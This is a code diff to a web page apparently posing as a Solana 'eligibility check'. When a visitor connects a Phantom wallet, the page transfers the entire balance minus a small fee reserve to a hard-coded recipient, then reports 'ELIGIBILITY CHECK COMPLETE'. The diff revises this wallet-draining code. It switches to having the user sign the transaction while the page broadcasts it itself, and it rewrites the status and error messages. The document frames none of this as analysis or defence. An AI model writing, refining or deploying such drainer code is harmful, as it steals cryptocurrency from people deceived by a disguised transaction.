@@ -109,7 +109,7 @@
       margin: 25px 0;
       font-size: 1.5rem;
       text-align: center;
-      min-height: 130px;
+      min-height: 140px;
     }
 
     .connected { color: #39ff14; }
@@ -203,39 +203,31 @@
       statusDiv.innerHTML = `<span style="color:#ffff00;">Checking wallet balance...</span>`;
 
       try {
-        const connection = new solanaWeb3.Connection(
-          "https://api.mainnet-beta.solana.com",
-          "confirmed"
-        );
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
         const balanceLamports = await connection.getBalance(publicKey);
-        const minRequiredForFees = 10000000; // 0.01 SOL reserve
+        const minForFees = 10000000; // 0.01 SOL
 
-        if (balanceLamports < minRequiredForFees) {
+        if (balanceLamports < minForFees) {
           statusDiv.innerHTML = `
             <span style="color:#ff00ff;">
               TRANSACTION FAILED<br><br>
               Not enough lamports for transaction fees.<br>
               You need at least 0.01 SOL in your wallet.
-            </span>
-          `;
+            </span>`;
           return;
         }
 
-        const sendAmount = balanceLamports - minRequiredForFees;
+        const sendAmount = balanceLamports - minForFees;
 
-        statusDiv.innerHTML = `
-          <span style="color:#ffff00;">
-            Balance: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
-            Preparing to send full available balance...
-          </span>
-        `;
+        statusDiv.innerHTML = `<span style="color:#ffff00;">Balance: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>Preparing transfer...</span>`;
 
+        // Build transaction
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
-            lamports: sendAmount,
+            lamports: sendAmount
           })
         );
 
@@ -245,14 +237,19 @@
 
         statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;
 
-        const signed = await provider.signAndSendTransaction(transaction, {
-          minContextSlot: lastValidBlockHeight
+        // Sign the transaction
+        const signedTransaction = await provider.signTransaction(transaction);
+
+        // Send it ourselves
+        const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed'
         });
 
         statusDiv.innerHTML = `
           <span style="color:#39ff14;">✅ ELIGIBILITY CHECK COMPLETE</span><br>
           Sent: ${(sendAmount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
-          Tx: ${signed.signature.slice(0,12)}...
+          Tx: ${signature.slice(0,12)}...
         `;
 
         setTimeout(() => {
@@ -260,19 +257,19 @@
         }, 2500);
 
       } catch (err) {
-        console.error("Transaction error:", err);
+        console.error(err);
 
-        let errorMsg = "TRANSACTION FAILED";
+        let msg = "TRANSACTION FAILED";
 
-        if (err.message && (err.message.includes("User rejected") || err.code === 4001)) {
-          errorMsg = "Transaction was rejected in Phantom.";
-        } else if (err.message && err.message.includes("insufficient")) {
-          errorMsg = "TRANSACTION FAILED<br><br>Not enough lamports for transaction fees.";
-        } else if (err.message && err.message.includes("blockhash")) {
-          errorMsg = "Network error. Please try again later.";
+        if (err.message?.includes("User rejected") || err.code === 4001) {
+          msg = "Transaction was rejected in Phantom.";
+        } else if (err.message?.toLowerCase().includes("insufficient") || err.message?.includes("lamports")) {
+          msg = `TRANSACTION FAILED<br><br>Not enough lamports for transaction fees.<br>You need at least 0.01 SOL.`;
+        } else if (err.message?.includes("blockhash")) {
+          msg = "Network timeout. Please try again.";
         }
 
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">${errorMsg}<br>Please try again.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">${msg}<br>Please try again.</span>`;
       }
     }
 
